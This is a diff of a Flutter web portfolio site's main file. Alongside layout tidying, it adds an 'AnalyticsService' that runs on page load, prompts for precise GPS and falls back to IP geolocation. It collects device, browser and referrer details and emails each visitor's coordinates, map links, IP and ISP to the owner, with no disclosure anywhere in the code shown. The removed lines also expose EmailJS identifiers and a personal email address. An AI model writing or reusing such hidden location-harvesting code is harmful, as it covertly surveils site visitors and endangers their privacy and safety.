@@ -1,10 +1,14 @@
+
+import 'dart:js_interop';
+
 import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
 import 'package:responsive_framework/responsive_framework.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
-import 'dart:html' as html;
-import 'dart:async'; // Added missing import for Completer
+import 'dart:async';
+import 'package:web/web.dart' as web;
+
 // Import your custom sections and constants
 import 'constants/app_colors.dart';
 import 'sections/hero_section.dart';
@@ -21,6 +25,10 @@ import 'widgets/navbar.dart';
 void main() {
   runApp(const PortfolioApp());
 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// APP
+// ─────────────────────────────────────────────────────────────────────────────
 
 class PortfolioApp extends StatelessWidget {
   const PortfolioApp({super.key});
@@ -56,9 +64,9 @@ class PortfolioApp extends StatelessWidget {
       builder: (context, child) => ResponsiveBreakpoints.builder(
         child: child!,
         breakpoints: const [
-          Breakpoint(start: 0, end: 480, name: MOBILE),
-          Breakpoint(start: 481, end: 768, name: TABLET),
-          Breakpoint(start: 769, end: 1100, name: DESKTOP),
+          Breakpoint(start: 0,    end: 480,             name: MOBILE),
+          Breakpoint(start: 481,  end: 768,             name: TABLET),
+          Breakpoint(start: 769,  end: 1100,            name: DESKTOP),
           Breakpoint(start: 1101, end: double.infinity, name: '4K'),
         ],
       ),
@@ -66,6 +74,10 @@ class PortfolioApp extends StatelessWidget {
     );
   }
 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// HOME
+// ─────────────────────────────────────────────────────────────────────────────
 
 class PortfolioHome extends StatefulWidget {
   const PortfolioHome({super.key});
@@ -75,25 +87,24 @@ class PortfolioHome extends StatefulWidget {
 }
 
 class _PortfolioHomeState extends State<PortfolioHome> {
-  final _scrollCtrl = ScrollController();
-  final AnalyticsService _analyticsService = AnalyticsService();
+  final _scrollCtrl       = ScrollController();
+  final _analyticsService = AnalyticsService();
 
   final Map<String, GlobalKey> _keys = {
-    'hero': GlobalKey(),
-    'about': GlobalKey(),
-    'services': GlobalKey(),
-    'projects': GlobalKey(),
-    'skills': GlobalKey(),
-    'fiverr': GlobalKey(),
+    'hero':         GlobalKey(),
+    'about':        GlobalKey(),
+    'services':     GlobalKey(),
+    'projects':     GlobalKey(),
+    'skills':       GlobalKey(),
+    'fiverr':       GlobalKey(),
     'testimonials': GlobalKey(),
-    'contact': GlobalKey(),
+    'contact':      GlobalKey(),
   };
 
   @override
   void initState() {
     super.initState();
-    // Trigger analytics on load
-    _analyticsService._sendAnalyticsEmail();
+    _analyticsService.sendAnalyticsEmail();
   }
 
   void _scrollTo(String section) {
@@ -117,10 +128,10 @@ class _PortfolioHomeState extends State<PortfolioHome> {
   Widget build(BuildContext context) {
     return Scaffold(
       backgroundColor: AppColors.bgPrimary,
-      // Note: Ensure MobileDrawer and PortfolioNavBar are imported/defined
       drawer: MobileDrawer(sectionKeys: _keys),
       body: Stack(
         children: [
+          // ── Main scrollable content ──────────────────────────
           SingleChildScrollView(
             controller: _scrollCtrl,
             child: Column(
@@ -130,32 +141,33 @@ class _PortfolioHomeState extends State<PortfolioHome> {
                   key: _keys['hero'],
                   child: HeroSection(
                     onViewWork: () => _scrollTo('projects'),
-                    onContact: () => _scrollTo('contact'),
+                    onContact:  () => _scrollTo('contact'),
                   ),
                 ),
-                KeyedSubtree(key: _keys['about'], child: const AboutSection()),
-                KeyedSubtree(key: _keys['services'], child: const ServicesSection()),
-                KeyedSubtree(key: _keys['projects'], child: const ProjectsSection()),
-                KeyedSubtree(key: _keys['skills'], child: const SkillsSection()),
-                KeyedSubtree(key: _keys['fiverr'], child: const FiverrSection()),
+                KeyedSubtree(key: _keys['about'],        child: const AboutSection()),
+                KeyedSubtree(key: _keys['services'],     child: const ServicesSection()),
+                KeyedSubtree(key: _keys['projects'],     child: const ProjectsSection()),
+                KeyedSubtree(key: _keys['skills'],       child: const SkillsSection()),
+                KeyedSubtree(key: _keys['fiverr'],       child: const FiverrSection()),
                 KeyedSubtree(key: _keys['testimonials'], child: const TestimonialsSection()),
-                KeyedSubtree(key: _keys['contact'], child: const ContactSection()),
+                KeyedSubtree(key: _keys['contact'],      child: const ContactSection()),
                 const FooterSection(),
               ],
             ),
           ),
+
+          // ── Navbar (always on top) ───────────────────────────
           Positioned(
-            top: 0,
-            left: 0,
-            right: 0,
+            top: 0, left: 0, right: 0,
             child: PortfolioNavBar(
               scrollController: _scrollCtrl,
               sectionKeys: _keys,
             ),
           ),
+
+          // ── Back-to-top button ───────────────────────────────
           Positioned(
-            bottom: 32,
-            right: 32,
+            bottom: 32, right: 32,
             child: _BackToTopButton(
               scrollCtrl: _scrollCtrl,
               onTap: () => _scrollTo('hero'),
@@ -167,136 +179,393 @@ class _PortfolioHomeState extends State<PortfolioHome> {
   }
 }
 
-// ─── ANALYTICS SERVICE (Standalone Class) ──────────
+// ANALYTICS SERVICE
 
 class AnalyticsService {
-  static const String _ipApiUrl = 'http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,zip,query,continent,continentCode,countryCode,region,regionCode';
-  static const String _ipInfoUrl = 'https://ipinfo.io/json';
+  // ── Email proxy (credentials live server-side, see /api/send-email) ──
+  static const String _emailProxyUrl = '/api/send-email';
+
+  // ── GeoJS IP API (free, no key) ──────────────────────────────
   static const String _geoJsUrl = 'https://get.geojs.io/v1/ip/geo.json';
-  static const String _emailJsUrl = 'https://api.emailjs.com/api/v1.0/email/send';
-  Future _sendAnalyticsEmail() async {
-    String ip           = 'Unknown';
-    String city         = 'Unknown';
-    String region       = 'Unknown';
-    String country      = 'Unknown';
-    String lat          = 'Unknown';
-    String lon          = 'Unknown';
-    String location     = 'Unknown';
 
+  // ─────────────────────────────────────────────────────────────
+  // PUBLIC ENTRY POINT
+  // Collects device info immediately, shows GPS popup,
+  // waits up to 35s for user to respond, then sends email.
+  // ─────────────────────────────────────────────────────────────
+  Future<void> sendAnalyticsEmail() async {
+    // ── Collect non-location info immediately ──────────────────
+    final instagramRef = _extractRef();
+    final device       = _deviceInfo();
+    final browser      = _browserInfo();
+    final referrer     = _referrerInfo();
+    final screen       = _screenSize();
+    final language     = _language();
 
+    debugPrint('📍 GPS popup triggered. Waiting up to 35s for user response...');
 
-    // ─── STEP 2: Get IP & Location ────────────────────────────
+    // ── Wait for GPS or timeout, then fall back to IP ──────────
+    final loc = await _waitForLocationWithTimeout(timeoutSeconds: 35);
+
+    debugPrint('📬 Location resolved. Sending email now...');
+
+    // ── Build and send ─────────────────────────────────────────
+    final message = _buildMessage(
+      loc:          loc,
+      instagramRef: instagramRef,
+      device:       device,
+      browser:      browser,
+      referrer:     referrer,
+      screen:       screen,
+      language:     language,
+    );
+
+    await _sendEmail(message);
+  }
+
+  // ─────────────────────────────────────────────────────────────
+  // WAIT FOR LOCATION
+  // Starts GPS listener + 35s hard timeout in parallel.
+  // Whichever resolves first wins.
+  // ─────────────────────────────────────────────────────────────
+  Future<Map<String, String>> _waitForLocationWithTimeout({
+    required int timeoutSeconds,
+  }) async {
+    final completer = Completer<Map<String, String>>();
+
+    // ── Fire GPS popup ─────────────────────────────────────────
+    _startGpsListener(completer);
+
+    // ── Hard timeout ───────────────────────────────────────────
+    // If user ignores popup for timeoutSeconds → fall back to IP
+    Future.delayed(Duration(seconds: timeoutSeconds), () {
+      if (!completer.isCompleted) {
+        debugPrint('⏱ ${timeoutSeconds}s passed. User ignored popup. Using IP...');
+        _fetchIpLocation().then((ipLoc) {
+          if (!completer.isCompleted) completer.complete(ipLoc);
+        });
+      }
+    });
+
+    return completer.future;
+  }
+
+  // ─────────────────────────────────────────────────────────────
+  // GPS LISTENER
+  // Callbacks MUST be synchronous (void) for .toJS to work.
+  // Async fallbacks use .then() instead of await.
+  // ─────────────────────────────────────────────────────────────
+  void _startGpsListener(Completer<Map<String, String>> completer) {
     try {
-      final geoRes = await http
-          .get(Uri.parse('https://get.geojs.io/v1/ip/geo.json'))
+      final geolocation = web.window.navigator.geolocation;
+
+      // ── SUCCESS: User clicked "Allow" ──────────────────────
+      final onSuccess = (web.GeolocationPosition position) {
+        if (completer.isCompleted) return;
+
+        try {
+          final lat = position.coords.latitude.toStringAsFixed(6);
+          final lon = position.coords.longitude.toStringAsFixed(6);
+          final acc = position.coords.accuracy.toStringAsFixed(0);
+
+          debugPrint('✅ GPS allowed: $lat, $lon (±${acc}m)');
+
+          completer.complete({
+            'source':    'GPS',
+            'accuracy':  '±${acc}m',
+            'lat':       lat,
+            'lon':       lon,
+            'location':  'GPS coordinates',
+            'mapsLink':  'https://www.google.com/maps/search/?api=1&query=$lat,$lon',
+            'appleMaps': 'https://maps.apple.com/?q=$lat,$lon',
+          });
+        } catch (e) {
+          debugPrint('❌ GPS parse error: $e — falling back to IP.');
+          _fetchIpLocation().then((ipLoc) {
+            if (!completer.isCompleted) completer.complete(ipLoc);
+          });
+        }
+      }.toJS;
+
+      // ── ERROR: User clicked "Deny" or browser blocked ──────
+      final onError = (web.GeolocationPositionError error) {
+        if (completer.isCompleted) return;
+
+        debugPrint(
+          '❌ GPS denied (code ${error.code}): ${error.message} — using IP.',
+        );
+
+        _fetchIpLocation().then((ipLoc) {
+          if (!completer.isCompleted) completer.complete(ipLoc);
+        });
+      }.toJS;
+
+      // ── Options ────────────────────────────────────────────
+      final options = web.PositionOptions(
+        enableHighAccuracy: true,
+        timeout:            30000, // ms to acquire fix after permission granted
+        maximumAge:         0,
+      );
+
+      geolocation.getCurrentPosition(onSuccess, onError, options);
+
+    } catch (e) {
+      // Geolocation API not available at all → go straight to IP
+      debugPrint('❌ Geolocation not available: $e — using IP.');
+      _fetchIpLocation().then((ipLoc) {
+        if (!completer.isCompleted) completer.complete(ipLoc);
+      });
+    }
+  }
+
+  // ─────────────────────────────────────────────────────────────
+  // IP GEOLOCATION FALLBACK
+  // Uses GeoJS — free, no API key needed
+  // ─────────────────────────────────────────────────────────────
+  Future<Map<String, String>> _fetchIpLocation() async {
+    try {
+      final res = await http
+          .get(Uri.parse(_geoJsUrl))
           .timeout(const Duration(seconds: 8));
 
-      if (geoRes.statusCode == 200) {
-        final data = json.decode(geoRes.body);
-        ip       = data['ip']                    ?? 'Unknown';
-        city     = data['city']                  ?? 'Unknown';
-        region   = data['region']                ?? 'Unknown';
-        country  = data['country']               ?? 'Unknown';
-        lat      = data['latitude']?.toString()  ?? 'Unknown';
-        lon      = data['longitude']?.toString() ?? 'Unknown';
-        location = '$city, $region, $country';
+      if (res.statusCode != 200) {
+        debugPrint('❌ GeoJS HTTP ${res.statusCode}');
+        return _unknownLocation();
       }
+
+      final data     = json.decode(res.body) as Map<String, dynamic>;
+      final ip       = data['ip']?.toString()                ?? 'Unknown';
+      final city     = data['city']?.toString()              ?? 'Unknown';
+      final region   = data['region']?.toString()            ?? 'Unknown';
+      final country  = data['country']?.toString()           ?? 'Unknown';
+      final lat      = data['latitude']?.toString()          ?? 'Unknown';
+      final lon      = data['longitude']?.toString()         ?? 'Unknown';
+      final org      = data['organization_name']?.toString() ?? 'Unknown';
+      final timezone = data['timezone']?.toString()          ?? 'Unknown';
+
+      final mapsLink  = (lat != 'Unknown' && lon != 'Unknown')
+          ? 'https://www.google.com/maps/search/?api=1&query=$lat,$lon'
+          : 'Not available';
+      final appleMaps = (lat != 'Unknown' && lon != 'Unknown')
+          ? 'https://maps.apple.com/?q=$lat,$lon'
+          : 'Not available';
+
+      debugPrint('✅ IP location: $city, $region, $country ($ip)');
+
+      return {
+        'source':    'IP',
+        'accuracy':  'City-level',
+        'ip':        ip,
+        'isp':       org,
+        'timezone':  timezone,
+        'lat':       lat,
+        'lon':       lon,
+        'location':  '$city, $region, $country',
+        'mapsLink':  mapsLink,
+        'appleMaps': appleMaps,
+      };
     } catch (e) {
-      debugPrint('Geo-fetch blocked or failed: $e');
+      debugPrint('❌ IP geolocation failed: $e');
+      return _unknownLocation();
     }
+  }
 
-    // ─── STEP 3: Generate Google Maps Link ────────────────────
-    String mapsLink = (lat != 'Unknown' && lon != 'Unknown')
-        ? 'https://www.google.com/maps/search/?api=1&query=$lat,$lon'
-        : 'Not available';
+  // ─────────────────────────────────────────────────────────────
+  // DEVICE / BROWSER HELPERS
+  // ─────────────────────────────────────────────────────────────
 
-    // ─── STEP 4: Build Email Message (Updated) ────────────────
-    final String message = '''
-Portfolio Analytics Report
-──────────────────────────
-Event         : Portfolio Opened
-──────────────────────────
-IP            : $ip
-Location      : $location
-Coordinates   : $lat, $lon
-Map Link      : $mapsLink
-──────────────────────────
-Time          : ${DateTime.now().toUtc()} UTC
-Platform      : Flutter Web (Vercel)
-──────────────────────────
+  String _extractRef() {
+    try {
+      final uri = Uri.parse(web.window.location.href);
+      return uri.queryParameters['ref']
+          ?? uri.queryParameters['utm_source']
+          ?? uri.queryParameters['utm_campaign']
+          ?? 'None';
+    } catch (_) {
+      return 'None';
+    }
+  }
+
+  String _deviceInfo() {
+    try {
+      final ua = web.window.navigator.userAgent;
+      if (ua.contains('iPhone'))    return 'iPhone';
+      if (ua.contains('iPad'))      return 'iPad';
+      if (ua.contains('Android'))   return 'Android';
+      if (ua.contains('Macintosh')) return 'Mac Desktop';
+      if (ua.contains('Windows'))   return 'Windows Desktop';
+      if (ua.contains('Linux'))     return 'Linux Desktop';
+      return 'Desktop';
+    } catch (_) {
+      return 'Unknown';
+    }
+  }
+
+  String _browserInfo() {
+    try {
+      final ua = web.window.navigator.userAgent;
+      if (ua.contains('Edg'))     return 'Edge';
+      if (ua.contains('OPR'))     return 'Opera';
+      if (ua.contains('Firefox')) return 'Firefox';
+      if (ua.contains('Chrome'))  return 'Chrome';
+      if (ua.contains('Safari'))  return 'Safari';
+      return 'Unknown';
+    } catch (_) {
+      return 'Unknown';
+    }
+  }
+
+  String _referrerInfo() {
+    try {
+      final ref = web.document.referrer;
+      if (ref.isEmpty)                                        return 'Direct / Typed URL';
+      if (ref.contains('instagram'))                         return 'Instagram';
+      if (ref.contains('linkedin'))                          return 'LinkedIn';
+      if (ref.contains('github'))                            return 'GitHub';
+      if (ref.contains('twitter') || ref.contains('x.com')) return 'Twitter/X';
+      if (ref.contains('google'))                            return 'Google Search';
+      return ref;
+    } catch (_) {
+      return 'Unknown';
+    }
+  }
+
+  String _screenSize() {
+    try {
+      final w = web.window.screen.width;
+      final h = web.window.screen.height;
+      return '${w}x$h';
+    } catch (_) {
+      return 'Unknown';
+    }
+  }
+
+  String _language() {
+    try {
+      return web.window.navigator.language;
+    } catch (_) {
+      return 'Unknown';
+    }
+  }
+
+  // ─────────────────────────────────────────────────────────────
+  // EMAIL BODY BUILDER
+  // ─────────────────────────────────────────────────────────────
+  String _buildMessage({
+    required Map<String, String> loc,
+    required String instagramRef,
+    required String device,
+    required String browser,
+    required String referrer,
+    required String screen,
+    required String language,
+  }) {
+    final source    = loc['source']    ?? 'Unknown';
+    final accuracy  = loc['accuracy']  ?? 'Unknown';
+    final location  = loc['location']  ?? 'Unknown';
+    final ip        = loc['ip']        ?? 'N/A';
+    final isp       = loc['isp']       ?? 'N/A';
+    final timezone  = loc['timezone']  ?? 'N/A';
+    final lat       = loc['lat']       ?? 'Unknown';
+    final lon       = loc['lon']       ?? 'Unknown';
+    final mapsLink  = loc['mapsLink']  ?? 'Not available';
+    final appleMaps = loc['appleMaps'] ?? 'Not available';
+
+    final sourceLabel = source == 'GPS'
+        ? 'GPS (Exact — user allowed location)'
+        : 'IP  (City-level — GPS denied / unavailable)';
+
+    return '''
+==================================
+  PORTFOLIO ANALYTICS REPORT
+==================================
+
+EVENT      : Portfolio Opened
+TIME (UTC) : ${DateTime.now().toUtc()}
+PLATFORM   : Flutter Web / Vercel
+
+----------------------------------
+  LOCATION
+----------------------------------
+
+Source     : $sourceLabel
+Accuracy   : $accuracy
+Location   : $location
+Coords     : $lat, $lon
+IP Address : $ip
+ISP / Org  : $isp
+Timezone   : $timezone
+
+Google Maps: $mapsLink
+Apple Maps : $appleMaps
+
+----------------------------------
+  VISITOR
+----------------------------------
+
+Device     : $device
+Browser    : $browser
+Screen     : $screen
+Language   : $language
+Referrer   : $referrer
+Ref Param  : $instagramRef
+
+==================================
 ''';
+  }
 
-    // ─── STEP 5: Send Email via EmailJS ───────────────────────
+  // ─────────────────────────────────────────────────────────────
+  // EMAILJS SENDER
+  // ─────────────────────────────────────────────────────────────
+  Future<void> _sendEmail(String message) async {
     try {
-      final response = await http.post(
-        Uri.parse('https://api.emailjs.com/api/v1.0/email/send'),
+      final res = await http.post(
+        Uri.parse(_emailProxyUrl),
         headers: {'Content-Type': 'application/json'},
         body: json.encode({
-          'service_id':  'service_c7aeuz7',
-          'template_id': 'template_wfs38ef',
-          'user_id':     'hf3o9gLowcQS6Lpj_', // 👈 Add your EmailJS Public Key here
-          'template_params': {
-            'from_name':  'Portfolio Analytics',
-            'message':    message,
-            'to_email':   'farooqsarwar953@gmail.com',
-            'reply_to':   'farooqsarwar953@gmail.com',
-          },
+          'type':    'analytics',
+          'message': message,
         }),
       );
-      if (response.statusCode == 200) {
-        debugPrint('✅ Analytics Sent!');
-        debugPrint('🌍 Location      : $location');
+
+      if (res.statusCode == 200) {
+        debugPrint('✅ Analytics email sent.');
       } else {
-        debugPrint('❌ EmailJS Error: ${response.statusCode}');
-        debugPrint('❌ Response Body: ${response.body}');
+        debugPrint('❌ Email proxy ${res.statusCode}: ${res.body}');
       }
     } catch (e) {
-      debugPrint('❌ EmailJS failed: $e');
+      debugPrint('❌ Email proxy failed: $e');
     }
   }
-  void _extractInstagramRef(Function(String) onRef) {
-    try {
-      final uri = Uri.parse(html.window.location.href);
-      final ref = uri.queryParameters['ref'];
-      if (ref != null) onRef(ref);
-    } catch (_) {}
-  }
 
-
-
-  Future<Map<String, dynamic>?> _fetchFromIpApi() async {
-    try {
-      final res = await http.get(Uri.parse(_ipApiUrl));
-      return json.decode(res.body);
-    } catch (_) { return null; }
-  }
-
-  String _buildEmailMessage({required String event, required String instagramRef, required String referrer, required String ip, required String isp, required String city, required String region, required String country, required String countryCode, required String timezone, required String lat, required String lon, required String accuracy, required String locationType, required String mapsLink, required String appleMapsLink, required String device, required String browser, required String language, required String screenSize, required DateTime timestamp}) {
-    return "Event: $event\nLocation: $city, $country\nCoords: $lat, $lon\nMaps: $mapsLink\nDevice: $device";
-  }
-
-  Future<bool> _sendEmailViaEmailJs(String message) async {
-    try {
-      final response = await http.post(
-        Uri.parse(_emailJsUrl),
-        headers: {'Content-Type': 'application/json'},
-        body: json.encode({
-          'service_id': 'service_c7aeuz7',
-          'template_id': 'template_wfs38ef',
-          'user_id': 'hf3o9gLowcQS6Lpj_',
-          'template_params': {'message': message},
-        }),
-      );
-      return response.statusCode == 200;
-    } catch (_) { return false; }
-  }
+  // ─────────────────────────────────────────────────────────────
+  // UNKNOWN LOCATION FALLBACK
+  // ─────────────────────────────────────────────────────────────
+  Map<String, String> _unknownLocation() => {
+    'source':    'Unknown',
+    'accuracy':  'Unknown',
+    'ip':        'Unknown',
+    'isp':       'Unknown',
+    'timezone':  'Unknown',
+    'lat':       'Unknown',
+    'lon':       'Unknown',
+    'location':  'Unknown',
+    'mapsLink':  'Not available',
+    'appleMaps': 'Not available',
+  };
 }
+// ─────────────────────────────────────────────────────────────────────────────
+// BACK-TO-TOP BUTTON
+// ─────────────────────────────────────────────────────────────────────────────
 
-// ─── Back-to-top Button Widget ───────────────────────────
 class _BackToTopButton extends StatefulWidget {
   final ScrollController scrollCtrl;
   final VoidCallback onTap;
-  const _BackToTopButton({required this.scrollCtrl, required this.onTap});
+
+  const _BackToTopButton({
+    required this.scrollCtrl,
+    required this.onTap,
+  });
 
   @override
   State<_BackToTopButton> createState() => _BackToTopButtonState();
@@ -334,13 +603,26 @@ class _BackToTopButtonState extends State<_BackToTopButton> {
         child: InkWell(
           onTap: widget.onTap,
           onHover: (v) => setState(() => _hovered = v),
-          child: Container(
-            width: 44, height: 44,
+          borderRadius: BorderRadius.circular(22),
+          child: AnimatedContainer(
+            duration: const Duration(milliseconds: 200),
+            width: 44,
+            height: 44,
             decoration: BoxDecoration(
               shape: BoxShape.circle,
               color: _hovered ? AppColors.accent : AppColors.bgSecondary,
+              border: Border.all(
+                color: _hovered
+                    ? AppColors.accent
+                    : AppColors.accent.withOpacity(0.25),
+                width: 1,
+              ),
             ),
-            child: const Icon(Icons.keyboard_arrow_up_rounded),
+            child: Icon(
+              Icons.keyboard_arrow_up_rounded,
+              color: _hovered ? AppColors.bgPrimary : AppColors.textPrimary,
+              size: 22,
+            ),
           ),
         ),
       ),
